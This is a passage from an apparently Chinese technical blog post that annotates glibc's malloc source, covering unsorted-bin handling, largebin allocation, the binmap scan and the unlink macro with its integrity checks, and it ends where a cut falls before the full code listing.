class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av))<span class="comment">//检查unsortedbin中是否确实有堆块,有则从unsortedbin中拿下第一个堆块</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;<span class="comment">//后继</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect(victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                        chunk2mem(victim), av);</span><br><span class="line">      size = chunksize(victim);<span class="comment">//根据size字段获取victim的大小</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">         only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">         runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">         exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">         no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(nb) &amp;&amp;<span class="comment">//如果是一个smallbin的分配申请</span></span><br><span class="line">          bck == unsorted_chunks(av) &amp;&amp;<span class="comment">//bck=victim-&gt;bk如果这个判断通过,说明刚从unsortedbin中拆下的堆块victim是unsoreted中唯一的堆块</span></span><br><span class="line">          victim == av-&gt;last_remainder &amp;&amp;<span class="comment">//如果victim是最近一次分配过的堆块,最近使用的堆块页面可能还在内存中,因此有这种优化</span></span><br><span class="line">          (<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE))<span class="comment">//如果这个victim堆块满足大小要求</span></span><br><span class="line">      &#123;<span class="comment">//这个victim通过了考察,下面将其分割,将满足大小要求的部分给用户,剩下的部分再放回unsortedbin</span></span><br><span class="line">        <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">        remainder_size = size - nb;<span class="comment">//剩余大小</span></span><br><span class="line">        remainder = chunk_at_offset(victim, nb);<span class="comment">//victim的前半部分将要分出去给用户,后面的剩下,remainder是剩下部分的基地址</span></span><br><span class="line">        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;<span class="comment">//更新unsortedbin中这个唯一堆块的剩余状态</span></span><br><span class="line">        av-&gt;last_remainder = remainder;<span class="comment">//剩余堆块记为最近使用</span></span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);<span class="comment">//设置前后指针都为unsortedbin桶子</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(remainder_size))<span class="comment">//如果剩下的部分属于largebin范围,则初始化两个指针</span></span><br><span class="line">        &#123;</span><br><span class="line">          remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);<span class="comment">//因为前块被分配,因此remainder的prev_inuse置1</span></span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);<span class="comment">//p=victim+0x10指向data区域</span></span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">      unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = unsorted_chunks(av);<span class="comment">//将bin从unsortedbin中拿出来,然后将其前后驱连接</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (size == nb)<span class="comment">//如果尝试分配的大小,恰好和这个unsortedbin堆块一样大则分配之</span></span><br><span class="line">      &#123;</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(size))<span class="comment">//如果这个刚摘下来的unsortedbin堆块属于smallbin范围,计算好新的前后邻居</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = smallbin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span><span class="comment">//否则说明这unsortedbin堆块属于largebin范围,计算好新的前后邻居</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = largebin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">        <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)(bck-&gt;bk-&gt;size))</span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>)size &lt; fwd-&gt;size)</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)size == (<span class="type">unsigned</span> <span class="type">long</span>)fwd-&gt;size)</span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//结算,前面不管是largebin还是smallbin,都已经计算好了前后邻居bck,fwd,在此将诸位连接</span></span><br><span class="line">      mark_bin(av, victim_index);<span class="comment">//标记binmap</span></span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS 10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)<span class="comment">//顶多合并10000次,太多次合并会导致本次请求响应太慢</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="largebin申请"><a href="#largebin申请" class="headerlink" title="largebin申请"></a>largebin申请</h5><p>如果到此还没有返回,也就是还没有申请到堆块下面再尝试使用largebin申请</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (!in_smallbin_range(nb))<span class="comment">//如果是一个largebin的请求</span></span><br><span class="line"> &#123;</span><br><span class="line">   bin = bin_at(av, idx);<span class="comment">//取桶子头</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">   <span class="keyword">if</span> ((victim = first(bin)) != bin &amp;&amp;</span><br><span class="line">       (<span class="type">unsigned</span> <span class="type">long</span>)(victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb))</span><br><span class="line">   &#123;<span class="comment">//first(bin)=bin-&gt;fd,可以看出bin-&gt;fd应该是该桶子中最大的一个堆块,然后顺着fd指针越来越小</span></span><br><span class="line">       <span class="comment">//如果最大的堆块都不满足nb的需求,显然再往后找更小的无意义,因此首先需要判断最大的堆块是否能满足要求,</span></span><br><span class="line"><span class="comment">//当这个前提条件满足时,再向后找最佳适配的堆块</span></span><br><span class="line">     victim = victim-&gt;bk_nextsize;<span class="comment">//bk_nextsize是下一个比当前victim小的堆块,victim-&gt;bk可能和victim一样大,但是victim-&gt;bk_nextsize要么是桶子头,要么一定比当前堆块小</span></span><br><span class="line">     <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>)(size = chunksize(victim)) &lt;</span><br><span class="line">             (<span class="type">unsigned</span> <span class="type">long</span>)(nb)))</span><br><span class="line">       victim = victim-&gt;bk_nextsize;<span class="comment">//从小开始遍历直到第一个大于等于nb大小的堆块</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">        list does not have to be rerouted.  */</span></span><br><span class="line">     <span class="keyword">if</span> (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">       victim = victim-&gt;fd;<span class="comment">//避免移除跳表的最开始一个导致变更指针,首先尝试寻找该大小的堆块是否有第二块,如果有则放过跳表头</span></span><br><span class="line">		</span><br><span class="line">     remainder_size = size - nb;<span class="comment">//victim块比较抠,只分配nb大小左右,多余的不给</span></span><br><span class="line">     unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Exhaust */</span></span><br><span class="line">     <span class="keyword">if</span> (remainder_size &lt; MINSIZE)<span class="comment">//如果发现victim分割后的剩余部分都是下脚料就不抠了</span></span><br><span class="line">     &#123;</span><br><span class="line">       set_inuse_bit_at_offset(victim, size);</span><br><span class="line">       <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">         victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">/* Split */</span></span><br><span class="line">     <span class="keyword">else</span><span class="comment">//否则victim剩余部分放到unsortedbin</span></span><br><span class="line">     &#123;</span><br><span class="line">       remainder = chunk_at_offset(victim, nb);<span class="comment">//取victim切割nb字节之后的剩余部分</span></span><br><span class="line">       <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">          have to perform a complete insert here.  */</span></span><br><span class="line">       bck = unsorted_chunks(av);</span><br><span class="line">       fwd = bck-&gt;fd;</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">       &#123;</span><br><span class="line">         errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">         <span class="keyword">goto</span> errout;</span><br><span class="line">       &#125;</span><br><span class="line">       remainder-&gt;bk = bck;<span class="comment">//头插法</span></span><br><span class="line">       remainder-&gt;fd = fwd;</span><br><span class="line">       bck-&gt;fd = remainder;</span><br><span class="line">       fwd-&gt;bk = remainder;</span><br><span class="line">       <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">       &#123;</span><br><span class="line">         remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;<span class="comment">//如果剩余大小还是largebin大小,则此时预先将指针清零</span></span><br><span class="line">         remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">       set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">       set_foot(remainder, remainder_size);</span><br><span class="line">     &#125;</span><br><span class="line">     check_malloced_chunk(av, victim, nb);</span><br><span class="line">     <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">     alloc_perturb(p, bytes);</span><br><span class="line">     <span class="keyword">return</span> p;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>





<h5 id="后续largebin申请"><a href="#后续largebin申请" class="headerlink" title="后续largebin申请"></a>后续largebin申请</h5><p>如果到此还没有分配,说明当前largebin里面没有找到何时的,那么向后面的largebin桶子中找</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">   bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">   (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">   that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">   The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">   when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">++idx;					<span class="comment">//取下一个桶子的下标</span></span><br><span class="line">bin = bin_at(av, idx);	<span class="comment">//首先查binmap,看看下一个桶子是否确实有空闲堆块</span></span><br><span class="line">block = idx2block(idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit(idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">  <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)<span class="comment">//如果bit&gt;map只可能是map=0,也就是当前block是空的</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">        <span class="keyword">goto</span> use_top;<span class="comment">//如果发现block遍历了4个block,全是空的,也就是largebin空了,直接使用top_chunk分配</span></span><br><span class="line">    &#125; <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);<span class="comment">//跳过所有空的largebin</span></span><br><span class="line"></span><br><span class="line">    bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">    bit = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">  <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)<span class="comment">//尝试找一个map对应block中有堆块的桶子</span></span><br><span class="line">  &#123;</span><br><span class="line">    bin = next_bin(bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;<span class="comment">//左移也就是往largebin更大的方向找</span></span><br><span class="line">    assert(bit != <span class="number">0</span>);</span><br><span class="line">  &#125;<span class="comment">//退出循环时,bin对应的桶子中一定有堆块</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">  victim = last(bin);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">  <span class="keyword">if</span> (victim == bin)<span class="comment">//检查是否该bin中至少有一个堆块,这是因为map是懒修改的</span></span><br><span class="line">  &#123;<span class="comment">//也就是说,map中标记有的不一定有,但是map中标记没有的一定没有</span></span><br><span class="line">    av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">      <span class="comment">//本桶子中确实没有,但也不是没有功劳,起码可以修改map,下一次查找一定不会查本桶子</span></span><br><span class="line">    bin = next_bin(bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;<span class="comment">//继续向更大的largebin桶子寻找</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span><span class="comment">//本桶子中确实有至少一个堆块</span></span><br><span class="line">  &#123;</span><br><span class="line">    size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">    assert((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb));</span><br><span class="line"></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlink */</span></span><br><span class="line">    unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Exhaust */</span></span><br><span class="line">    <span class="keyword">if</span> (remainder_size &lt; MINSIZE)<span class="comment">//下脚料一起送人</span></span><br><span class="line">    &#123;</span><br><span class="line">      set_inuse_bit_at_offset(victim, size);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Split */</span></span><br><span class="line">    <span class="keyword">else</span>		<span class="comment">//切割指定大小的堆块,剩下的送给unsortedbin</span></span><br><span class="line">    &#123;</span><br><span class="line">      remainder = chunk_at_offset(victim, nb);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">         have to perform a complete insert here.  */</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      remainder-&gt;bk = bck;</span><br><span class="line">      remainder-&gt;fd = fwd;</span><br><span class="line">      bck-&gt;fd = remainder; </span><br><span class="line">      fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">      &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">      set_foot(remainder, remainder_size);</span><br><span class="line">    &#125;</span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h6 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h6><p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/unlink.png" alt="unlink"></p>
<p>从双向链表上摘下一个堆块<code>P</code>,把它的前后驱重新链接起来</p>
<p>针对<code>smallbin</code>和<code>unsortedbin</code>,有如下检查</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;bk-&gt;fd==P</span><br><span class="line">P-&gt;fd-&gt;bk==P</span><br></pre></td></tr></table></figure>

<p>如果是一个<code>largebin</code>的堆块,还会有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd_nextsize-&gt;bk_nextsize==P</span><br><span class="line">P-&gt;bk_nextsize-&gt;fd_nextsize==P</span><br></pre></td></tr></table></figure>

<p>对于<code>smallbin</code>和<code>unsortedbin</code>,如果检查通过,则执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK;                                                                                                          \</span><br><span class="line">BK-&gt;fd = FD;     </span><br></pre></td></tr></table></figure>

<p>将P的前后驱连接起来</p>
<p>对于<code>largebin</code>的堆块,还会执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>)                                                                                        \</span><br><span class="line">&#123;                                                                                                                   \</span><br><span class="line">  <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                                                                          \</span><br><span class="line">    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                                                                         \</span><br><span class="line">  <span class="keyword">else</span>                                                                                                              \</span><br><span class="line">  &#123;                                                                                                                 \</span><br><span class="line">    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                                                                               \</span><br><span class="line">    FD-&gt;bk_nextsize </span><br><span class="line">    = P-&gt;bk_nextsize;                                                                               \</span><br><span class="line">    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                                                                               \</span><br><span class="line">    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                                                                               \</span><br><span class="line">  &#125;                                                                                                                 \</span><br><span class="line">&#125;                                                                                                                   \</span><br><span class="line"><span class="keyword">else</span>                                                                                                                \</span><br><span class="line">&#123;                                                                                                                   \</span><br><span class="line">  P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                                                                     \</span><br><span class="line">  P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                                                                     \</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<p>完整代码如下:</p>
